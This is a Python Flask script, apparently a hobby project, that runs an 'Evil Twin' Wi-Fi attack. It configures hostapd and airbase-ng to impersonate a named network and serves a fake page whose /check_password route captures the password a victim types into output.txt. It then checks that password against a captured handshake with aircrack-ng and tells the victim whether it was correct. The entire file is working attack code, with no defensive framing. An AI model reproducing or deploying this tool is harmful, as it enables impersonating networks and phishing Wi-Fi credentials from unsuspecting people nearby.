# main.py

import os
import subprocess
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Set the desired WiFi SSID and channel
WiFi_SSID = "TestNetwork"
WiFi_CHANNEL = "6"

# Set the IP address and subnet mask for wlan1
wlan1_ip = "192.168.4.2"
subnet_mask = "255.255.255.0"


# SEM MAL IST ORIGINALNY HOSTAPD


# ------------------------------------------- #
# create TEST EvilTwinhostapd.conf
hostapd_config = f'''interface=wlan1
driver=nl80211
ssid={WiFi_SSID}
hw_mode=g
channel={WiFi_CHANNEL}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''
# ------------------------------------------- #

with open("EvilTwinhostapd.conf", "w") as conf_file:
    conf_file.write(hostapd_config)

# Set IP address and subnet mask for wlan1
subprocess.run(["sudo", "ifconfig", "wlan1", wlan1_ip, "netmask", subnet_mask])

# Start hostapd using subprocess
hostapd_process = subprocess.Popen(["sudo", "hostapd", "EvilTwinhostapd.conf"])

# Wait for hostapd to initialize before starting airbase-ng
time.sleep(5)

# Start airbase-ng using subprocess
airbase_process = subprocess.Popen(["sudo", "airbase-ng", "-e", WiFi_SSID, "-c", WiFi_CHANNEL, "wlan1"])

def cleanup_processes():
    # Terminate both hostapd and airbase-ng processes
    hostapd_process.terminate()
    airbase_process.terminate()

# Attach the cleanup function to SIGINT signal (Ctrl+C)
import signal
signal.signal(signal.SIGINT, lambda x, y: cleanup_processes())

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check_password', methods=['POST'])
def check_password():
    user_input = request.json['password']

    # Save user input to the file
    with open("output.txt", "w") as file:
        file.write(user_input)

    # Placeholder for the aircrack-ng command (replace this with your actual command)
    aircrack_command = ["aircrack-ng", "WiFiNetwork-01.cap", "-w", "output.txt"]
                                                 
    # Run the aircrack-ng command
    aircrack_result = subprocess.run(aircrack_command, capture_output=True, text=True)

    # Check the output for the correct password
    if "KEY FOUND" in aircrack_result.stdout:
        message = "Correct password :D"
    else:
        message = "Incorrect password! Please try again."

    return jsonify({'message': message})

if __name__ == "__main__":
    try:
        app.run(host='0.0.0.0', port=80, debug=True)
    finally:
        # Ensure to terminate both hostapd and airbase-ng processes when the Flask app exits
        cleanup_processes()

